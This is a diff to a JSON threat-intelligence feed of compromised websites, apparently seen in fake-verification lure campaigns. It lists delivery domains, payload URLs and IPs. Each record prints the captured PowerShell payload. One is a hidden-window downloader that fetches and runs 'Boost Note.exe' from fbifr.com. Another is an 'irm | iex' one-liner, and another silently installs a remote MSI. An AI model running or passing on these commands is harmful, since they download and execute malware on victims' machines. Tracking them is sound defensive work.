@@ -1,5 +1,79 @@
 [
   {
+    "UrlDomain": "dubaiicc.org",
+    "DeliveryUrl": [
+      "lovezramexar.info",
+      "makeverizyjar.info",
+      "fbifr.com"
+    ],
+    "PayloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "IP": [
+      "134.199.232.142"
+    ],
+    "Related": [
+      {
+        "Value": "https://lovezramexar.info/api.php?s=4a67ef89c0c750abf170c83e5a5922de63802862343d2c6b&amp;_v=29914667",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://makeverizyjar.info/api.php?s=9fee61d3c60417b2704fbe23c5b2abb636003abc2254fd89&amp;_v=29914667",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "ReportId": "cmwk1atw219gr0oml6sk6cbtv",
+    "ScannedAt": "2026-11-17T01:49:13.081000+00:00"
+  },
+  {
+    "UrlDomain": "mnbarberstudio.com",
+    "DeliveryUrl": [
+      "fbifr.com"
+    ],
+    "PayloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "IP": [
+      "78.142.208.11"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "ReportId": "cmwk19p8v19fi0omldrlx19g0",
+    "ScannedAt": "2026-11-17T01:48:20.434000+00:00"
+  },
+  {
+    "UrlDomain": "igrowseo.com",
+    "DeliveryUrl": [
+      "lovezramexar.info",
+      "fbifr.com"
+    ],
+    "PayloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "IP": [
+      "65.109.111.76"
+    ],
+    "Related": [
+      {
+        "Value": "https://lovezramexar.info/api.php?s=4a67ef89c0c750abf170c83e5a5922de63802862343d2c6b&amp;_v=29914654",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "ReportId": "cmwk0sutc19dk0omldqs77qbt",
+    "ScannedAt": "2026-11-17T01:35:14.437000+00:00"
+  },
+  {
     "UrlDomain": "dghomes.properties",
     "DeliveryUrl": [
       "fbifr.com"
@@ -4069,46 +4143,5 @@
     ],
     "ReportId": "cmwej31qk0cf00omlfkkf1xkc",
     "ScannedAt": "2026-11-13T05:20:26.050000+00:00"
-  },
-  {
-    "UrlDomain": "unnorte.digital",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "162.241.203.246"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/aa57ea23162442f3",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/aa57ea23162442f3'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/aa57ea23162442f3"
-    ],
-    "ReportId": "cmwebrdpf0c2l0omlh3h75cni",
-    "ScannedAt": "2026-11-13T01:55:24.301000+00:00"
-  },
-  {
-    "UrlDomain": "lawservices.al",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "91.108.98.152"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwebebjc0c1o0oml57p74iht",
-    "ScannedAt": "2026-11-13T01:45:15.056000+00:00"
   }
 ]
